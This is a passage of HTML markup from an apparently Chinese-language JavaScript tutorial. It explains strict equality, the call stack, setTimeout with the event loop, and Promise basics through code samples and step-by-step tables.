<span class="hljs-number">0</span>;    <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><p>因此引入严格判断：</p><ul><li><code>===</code>：数据类型与数据均相等时才为 <code>true</code>。</li><li><code>!==</code>：数据类型或数据有一个不同就为 <code>true</code>。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-number">5</span> === <span class="hljs-string">'5'</span>;<span class="hljs-comment">// false</span><br><span class="hljs-string">''</span> === <span class="hljs-string">'0'</span><span class="hljs-comment">// false</span><br><span class="hljs-string">''</span> === <span class="hljs-number">0</span><span class="hljs-comment">// false</span><br><span class="hljs-string">'5'</span> !== <span class="hljs-number">5</span><span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure><h1 id="4-异步"><a href="#4-异步" class="headerlink" title="4. 异步"></a>4. 异步</h1><h2 id="同步模式"><a href="#同步模式" class="headerlink" title="同步模式"></a>同步模式</h2><p>单线程下，程序按编写顺序排队进行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Let's start!"</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">a</span>(<span class="hljs-params"></span>) {<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"a"</span>);<br>}<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">b</span>(<span class="hljs-params"></span>) {<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"b"</span>);<br><span class="hljs-title function_">a</span>();<br>}<br><br><span class="hljs-title function_">b</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"World Ender"</span>);<br></code></pre></td></tr></table></figure><p>大致执行顺序如下：</p><div class="table-container"><table><thead><tr><th style="text-align:left">调用栈的情况</th><th style="text-align:center">操作</th><th style="text-align:left">console</th></tr></thead><tbody><tr><td style="text-align:left"><code>(anoymous)</code> （匿名调用）</td><td style="text-align:center">全代码打包作为匿名调用压入栈</td><td style="text-align:left"></td></tr><tr><td style="text-align:left"><code>console.log("Let's start!")</code><br><code>(anoymous)</code></td><td style="text-align:center"><code>console.log("Let's start!")</code> 入栈执行</td><td style="text-align:left">Let’s start!</td></tr><tr><td style="text-align:left"><code>(anoymous)</code></td><td style="text-align:center"><code>console.log("Let's start!")</code> 出栈</td><td style="text-align:left">Let’s start!</td></tr><tr><td style="text-align:left"><code>b()</code><br><code>(anoymous)</code></td><td style="text-align:center"><code>b()</code> 入栈</td><td style="text-align:left">Let’s start!</td></tr><tr><td style="text-align:left"><code>console.log("b")</code> <br><code>b()</code><br><code>(anoymous)</code></td><td style="text-align:center"><code>console.log("b")</code> 入栈执行</td><td style="text-align:left">Let’s start!<br>b</td></tr><tr><td style="text-align:left"><code>b()</code><br><code>`(anoymous)</code> `</td><td style="text-align:center"><code>console.log("b")</code> 出栈</td><td style="text-align:left">Let’s start!<br>b</td></tr><tr><td style="text-align:left"><code>a()</code><br><code>b()</code><br><code>(anoymous)</code></td><td style="text-align:center"><code>a()</code> 入栈</td><td style="text-align:left">Let’s start!<br>b</td></tr><tr><td style="text-align:left"><code>console.log("a")</code> <br><code>a()</code><br><code>b()</code><br><code>(anoymous)</code></td><td style="text-align:center"><code>console.log("a")</code> 入栈执行</td><td style="text-align:left">Let’s start!<br>b<br>a</td></tr><tr><td style="text-align:left"><code>a()</code><br><code>b()</code><br><code>(anoymous)</code></td><td style="text-align:center"><code>console.log("a")</code> 出栈</td><td style="text-align:left">Let’s start!<br>b<br>a</td></tr><tr><td style="text-align:left"><code>b()</code><br><code>(anoymous)</code></td><td style="text-align:center"><code>a()</code> 出栈</td><td style="text-align:left">Let’s start!<br>b<br>a</td></tr><tr><td style="text-align:left"><code>(anoymous)</code></td><td style="text-align:center"><code>b()</code> 出栈</td><td style="text-align:left">Let’s start!<br>b<br>a</td></tr><tr><td style="text-align:left"><code>console.log("World Ender")</code><br><code>(anoymous)</code></td><td style="text-align:center"><code>console.log("World Ender")</code> 入栈执行</td><td style="text-align:left">Let’s start!<br>b<br>a<br>World Ender</td></tr><tr><td style="text-align:left"><code>(anoymous)</code></td><td style="text-align:center"><code>console.log("World Ender")</code> 出栈</td><td style="text-align:left">Let’s start!<br>b<br>a<br>World Ender</td></tr><tr><td style="text-align:left"></td><td style="text-align:center">函数执行完毕，调用栈清空</td><td style="text-align:left">Let’s start!<br>b<br>a<br>World Ender</td></tr></tbody></table></div><h2 id="异步模式"><a href="#异步模式" class="headerlink" title="异步模式"></a>异步模式</h2><h3 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout()"></a><code>setTimeout()</code></h3><p><code>setTimeot(func, time)</code> 指在经过 time(ms) 后，再执行 <code>func</code> 函数（回调函数）的内容，期间可以执行程序中的其他步骤。</p><p>下方展示了一个简单的例子。输出效果为：</p><p>“Let’s start!”  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.262ex" height="2.058ex" role="img" focusable="false" viewBox="0 -898.8 1000 909.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z"></path></g></g><g data-mml-node="mpadded" transform="translate(205.5,798.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mspace"></g></g></g></g></g></g></svg></mjx-container>  “World Ender”  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="2.883ex" height="3.127ex" role="img" focusable="false" viewBox="0 -1300.3 1274.2 1382.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z" transform="translate(274.2,0)"></path><svg width="374.2" height="865" x="0" y="-182" viewBox="93.6 -182 374.2 865"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" transform="scale(0.721,1)"></path></svg></g></g><g data-mml-node="mpadded" transform="translate(0,870.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mspace" transform="translate(969,0)"></g></g></g></g></g></g></svg></mjx-container>  “timer 2”  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="4.127ex" height="3.127ex" role="img" focusable="false" viewBox="0 -1300.3 1824.3 1382.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z" transform="translate(824.3,0)"></path><svg width="924.3" height="865" x="0" y="-182" viewBox="231.1 -182 924.3 865"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" transform="scale(1.782,1)"></path></svg></g></g><g data-mml-node="mpadded" transform="translate(0,870.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(778,0)"></path></g><g data-mml-node="mi" transform="translate(1278,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mspace" transform="translate(1747,0)"></g></g></g></g></g></g></svg></mjx-container>  “timer 1”  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="4.127ex" height="3.127ex" role="img" focusable="false" viewBox="0 -1300.3 1824.3 1382.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z" transform="translate(824.3,0)"></path><svg width="924.3" height="865" x="0" y="-182" viewBox="231.1 -182 924.3 865"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" transform="scale(1.782,1)"></path></svg></g></g><g data-mml-node="mpadded" transform="translate(0,870.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(778,0)"></path></g><g data-mml-node="mi" transform="translate(1278,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mspace" transform="translate(1747,0)"></g></g></g></g></g></g></svg></mjx-container>  “Inside timer 2”</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Let's start!"</span>);<br><br><span class="hljs-built_in">setTimeout</span>( <span class="hljs-function">() =&gt;</span> {<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"timer 1"</span>);<br>}, <span class="hljs-number">1800</span>);<br><br><span class="hljs-built_in">setTimeout</span>( <span class="hljs-function">() =&gt;</span> {<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"timer 2"</span>);<br>    <span class="hljs-built_in">setTimeout</span>( <span class="hljs-function">() =&gt;</span> {<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Inside timer 2"</span>);<br>    }, <span class="hljs-number">1000</span>);<br>}, <span class="hljs-number">1000</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"World Ender"</span>);<br></code></pre></td></tr></table></figure><p>我们使用 <code>Timer 1</code>，<code>Timer 2</code> 和 <code>Inside</code> 来代指三个匿名函数。</p><div class="table-container"><table><thead><tr><th style="text-align:center">Queue</th><th style="text-align:center">Web API</th><th style="text-align:left">调用栈的情况</th><th style="text-align:center">操作</th><th>Console</th></tr></thead><tbody><tr><td style="text-align:center">待办队列</td><td style="text-align:center">这次中就是计时器</td><td style="text-align:left"><code>(anoymous)</code></td><td style="text-align:center">全代码打包作为匿名调用压入栈</td><td></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"><code>(anoymous)</code></td><td style="text-align:center"><code>console.log("Let's start!")</code> <br>入栈，执行，出栈</td><td>Let’s start!</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"><strong>1.8s 倒计时开始</strong></td><td style="text-align:left"><code>setTimeout(Timer 1)</code> <br><code>(anoymous)</code></td><td style="text-align:center"><code>setTimeout(Timer 1)</code> 入栈</td><td>Let’s start!</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1.8s 倒计时进行</td><td style="text-align:left"><code>(anoymous)</code></td><td style="text-align:center"><code>setTimeout(Timer 1)</code> 出栈</td><td>Let’s start!</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1.8s 倒计时进行<br><strong>1s 倒计时开始</strong></td><td style="text-align:left"><code>setTimeout(Timer 2)</code> <br><code>(anoymous)</code></td><td style="text-align:center"><code>setTimeout(Timer 2)</code> 入栈</td><td>Let’s start!</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1.8s 倒计时进行<br>1s 倒计时进行</td><td style="text-align:left"><code>(anoymous)</code></td><td style="text-align:center"><code>setTimeout(Timer 2)</code> 出栈</td><td>Let’s start!</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1.8s 倒计时进行<br>1s 倒计时进行</td><td style="text-align:left"><code>(anoymous)</code></td><td style="text-align:center"><code>console.log("World Ender")</code> <br>入栈，执行，出栈</td><td>Let’s start<br>World Ender</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1.8s 倒计时进行<br>1s 倒计时进行</td><td style="text-align:left"></td><td style="text-align:center">函数执行完毕，调用栈清空</td><td>Let’s start<br>World Ender</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:center"><strong><em>漫长的等待</em></strong></td><td></td></tr><tr><td style="text-align:center">Timer 2</td><td style="text-align:center"><em>1s 倒计时结束</em><br>1.8s 倒计时进行</td><td style="text-align:left"></td><td style="text-align:center"><code>Timer 2</code> 进入待办队列，被事件循环监听到</td><td>Let’s start!<br>World Ender</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1.8s 倒计时进行</td><td style="text-align:left"><code>Timer 2</code></td><td style="text-align:center"><code>timer 2</code>入栈</td><td>Let’s start!<br>World Ender</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1.8s 倒计时进行</td><td style="text-align:left"><code>Timer 2</code></td><td style="text-align:center"><code>console.log("timer 2")</code> <br>入栈，执行，出栈</td><td>Let’s start!<br>World Ender<br>timer 2</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1.8s 倒计时进行<br><strong>1s 倒计时(2) 开始</strong></td><td style="text-align:left"><code>setTimeout(Inside)</code> <br><code>Timer 2</code></td><td style="text-align:center"><code>setTimeout(Inside)</code> 入栈</td><td>Let’s start!<br>World Ender<br>timer 2</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1.8s 倒计时进行<br>1s 倒计时(2) 进行</td><td style="text-align:left"><code>Timer 2</code></td><td style="text-align:center"><code>setTimeout(Inside)</code> 出栈</td><td>Let’s start!<br>World Ender<br>timer 2</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1.8s 倒计时进行<br>1s 倒计时(2) 进行</td><td style="text-align:left"></td><td style="text-align:center"><code>Timer 2</code> 执行完毕，出栈</td><td>Let’s start!<br>World Ender<br>timer 2</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:center"><strong><em>并不漫长的等待</em></strong></td><td></td></tr><tr><td style="text-align:center">Timer 1</td><td style="text-align:center"><em>1.8 s 倒计时结束</em><br>1s 倒计时(2) 进行</td><td style="text-align:left"></td><td style="text-align:center"><code>Timer 1</code> 进入待办队列，被事件循环监听到</td><td>Let’s start!<br>World Ender<br>timer 2</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1s 倒计时(2) 进行</td><td style="text-align:left"><code>Timer 1</code></td><td style="text-align:center"><code>Timer 1</code> 入栈</td><td>Let’s start!<br>World Ender<br>timer 2</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1s 倒计时(2) 进行</td><td style="text-align:left"><code>Timer 1</code></td><td style="text-align:center"><code>console.log("timer 1")</code>  <br>入栈，执行，出栈</td><td>Let’s start!<br>World Ender<br>timer 2<br>timer 1</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1s 倒计时(2) 进行</td><td style="text-align:left"></td><td style="text-align:center"><code>Timer 1</code> 执行完毕，出栈</td><td>Let’s start!<br>World Ender<br>timer 2<br>timer 1</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:center"><strong><em>简短的等待</em></strong></td><td></td></tr><tr><td style="text-align:center">Inside</td><td style="text-align:center"><em>1s 倒计时(2)结束</em></td><td style="text-align:left"></td><td style="text-align:center"><code>Inside</code> 进入待办队列，被事件循环监听到</td><td>Let’s start!<br>World Ender<br>timer 2<br>timer 1</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"><code>Inside</code></td><td style="text-align:center"><code>Inside</code> 入栈</td><td>Let’s start!<br>World Ender<br>timer 2<br>timer 1</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"><code>Inside</code></td><td style="text-align:center"><code>console.log("Inside timer 2")</code><br>入栈，执行，出栈</td><td>Let’s start!<br>World Ender<br>timer 2<br>timer 1<br>Inside timer 2</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:center"><code>Inside</code> 出栈</td><td>Let’s start!<br>World Ender<br>timer 2<br>timer 1<br>Inside timer 2</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:left"></td><td style="text-align:center"><strong><em>完</em></strong></td></tr></tbody></table></div><p>由于 <code>setTimeout()</code> 多层嵌套难以识别和维护，被称为“回调地狱”（callback hell） ，现在使用 <code>Promise</code> 代替。</p><p>下面展示了一个多层嵌套的 <code>setTimeout()</code>，实际效果为每隔一秒进行一次输出。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">setTimeout</span>( <span class="hljs-function">() =&gt;</span> {<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">setTimeout</span>( <span class="hljs-function">() =&gt;</span> {<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">2</span>);<br><span class="hljs-built_in">setTimeout</span>( <span class="hljs-function">() =&gt;</span> {<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">3</span>);<br>}, <span class="hljs-number">1000</span>);<br>}, <span class="hljs-number">1000</span>);<br>}, <span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><h3 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a><code>Promise</code></h3><p>一个承诺，有 <code>pending</code>（进行中），<code>fullfilled</code>（已成功），<code>rejected</code>（已失败）三种状态。视结果成功与否可以返回不同的值。</p><p><code>Promise</code> 对象通过 <code>new</code> 来创建，有一个函数类型的参数。其基本形式如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> promise1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>( <span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {<br><span class="hljs-comment">/* 这里可以有一些操作，如setTimeout等 */</span><br><span class="hljs-title function_">resolve</span>(成功时的返回值);<span class="hljs-comment">// 一般都要有,返回值空着也行</span><br><span class="hljs-title function_">reject</span>( <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(失败时弹出的提示) );<span class="hljs-comment">// 可以没有</span><br>} )<br></code></pre></td></tr></table></figure><p>也可以将其作为函数的返回值以传入一些参数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">promiseWithSetTimeout</span>(<span class="hljs-params">ms</span>) {<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>( <span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {<br><span class="hljs-built_in">setTimeout</span>( <span class="hljs-function">() =&gt;</span> {<br><span class="hljs-title function_">resolve</span>(<span class="hljs-string">"It's resolved."</span>);<br><span class="hljs-title function_">reject</span>( <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"It's rejected."</span>) );<br>}, ms );<br>} );<br>}<br></code></pre></td></tr></table></figure><p>我们通过 <code>.then</code> 来使用 <code>Promise</code>，<code>.catch</code> 来捕获 <code>Promise</code> 失败后的错误。</p><p>简化一下上面的函数，返回值就不要了，使其永远触发 <code>resolved</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">promiseWithSetTimeout</span>(<span class="hljs-params">ms</span>) {<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>( <span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {<br><span class="hljs-built_in">setTimeout</span>( resolve, ms );<br>} );<br>}<br></code></pre></td></tr></table></figure><p><code>.then</code> 的参数为两个函数，当 <code>resolve</code> 时运行第一个，<code>reject</code> 时运行第二个（没有也行，就是会报错，直接弹出预设的错误提示），错误会先被第二个函数捕捉，不存在时才会被 <code>.catch</code> 捕捉。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">promiseWithSetTimeout</span>(<span class="hljs-number">1000</span>)<br>.<span class="hljs-title function_">then</span>( <span class="hljs-function">() =&gt;</span> {<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"1st Resolved."</span>);<br>},<br>         <span class="hljs-function">() =&gt;</span> {<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"1st Rejected."</span>);<br>}<br>    )<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"World Ender"</span>);<br></code></pre></td></tr></table></figure><p>输出：<code>World Ender</code>  <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="2.883ex" height="3.127ex" role="img" focusable="false" viewBox="0 -1300.3 1274.2 1382.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mstyle"><g data-mml-node="mo"><path data-c="2192" d="M56 237T56 250T70 270H835Q719 357 692 493Q692 494 692 496T691 499Q691 511 708 511H711Q720 511 723 510T729 506T732 497T735 481T743 456Q765 389 816 336T935 261Q944 258 944 250Q944 244 939 241T915 231T877 212Q836 186 806 152T761 85T740 35T732 4Q730 -6 727 -8T711 -11Q691 -11 691 0Q691 7 696 25Q728 151 835 230H70Q56 237 56 250Z" transform="translate(274.2,0)"></path><svg width="374.2" height="865" x="0" y="-182" viewBox="93.6 -182 374.2 865"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" transform="scale(0.721,1)"></path></svg></g></g><g data-mml-node="mpadded" transform="translate(0,870.8) scale(0.707)"><g transform="translate(278,-200)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D460" d="M131 